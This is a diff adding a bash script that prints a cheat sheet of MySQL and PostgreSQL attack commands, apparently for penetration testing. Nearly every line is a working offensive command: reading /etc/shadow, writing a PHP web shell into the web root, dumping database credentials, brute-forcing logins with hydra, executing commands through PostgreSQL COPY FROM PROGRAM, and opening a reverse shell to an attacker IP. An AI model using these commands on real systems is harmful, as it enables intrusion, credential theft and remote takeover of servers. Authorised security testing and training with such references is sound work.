@@ -1,0 +1,58 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── MYSQL / POSTGRESQL — ATTACKS ──────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── MySQL Connect ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}mysql -h <TARGET> -u root${NC}                        # no password"
+echo -e "  ${GREEN}mysql -h <TARGET> -u root -p${NC}                     # prompt password"
+echo -e "  ${GREEN}mysql -h <TARGET> -u <USER> -p<PASS>${NC}             # inline password"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── MySQL Useful Queries ─────────────────────────────${NC}"
+echo -e "  ${GREEN}select load_file('/etc/shadow');${NC}                 # read file (if FILE priv)"
+echo -e "  ${GREEN}select '<?php echo shell_exec(\$_GET[\"cmd\"]);?>' into OUTFILE '/var/www/html/shell.php';${NC}"
+echo -e "  ${GREEN}show databases;${NC}"
+echo -e "  ${GREEN}use <database>;${NC}"
+echo -e "  ${GREEN}show tables;${NC}"
+echo -e "  ${GREEN}select user,password from mysql.user;${NC}            # dump MySQL creds"
+echo -e "  ${GREEN}select @@hostname, @@basedir, @@datadir;${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── MySQL Brute ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET> mysql${NC}"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u users.txt -p passwords.txt --continue-on-success${NC}  # for MSSQL"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PostgreSQL Connect ───────────────────────────────${NC}"
+echo -e "  ${GREEN}psql -h <TARGET> -U postgres${NC}                     # default user"
+echo -e "  ${GREEN}psql -h <TARGET> -U <USER> -d <DATABASE>${NC}         # specify database"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PostgreSQL Command Execution ─────────────────────${NC}"
+echo -e "  ${GREEN}CREATE TABLE cmd_exec(cmd_output text);${NC}"
+echo -e "  ${GREEN}COPY cmd_exec FROM PROGRAM 'id';${NC}"
+echo -e "  ${GREEN}SELECT * FROM cmd_exec;${NC}"
+echo -e "  ${GREEN}COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1';${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PostgreSQL Useful ────────────────────────────────${NC}"
+echo -e "  ${GREEN}select pg_ls_dir('./');${NC}                          # list dirs"
+echo -e "  ${GREEN}select version();${NC}"
+echo -e "  ${GREEN}\\l${NC}                                               # list databases"
+echo -e "  ${GREEN}\\dt${NC}                                              # list tables"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PostgreSQL Brute ─────────────────────────────────${NC}"
+echo -e "  ${GREEN}hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt <TARGET> postgres${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
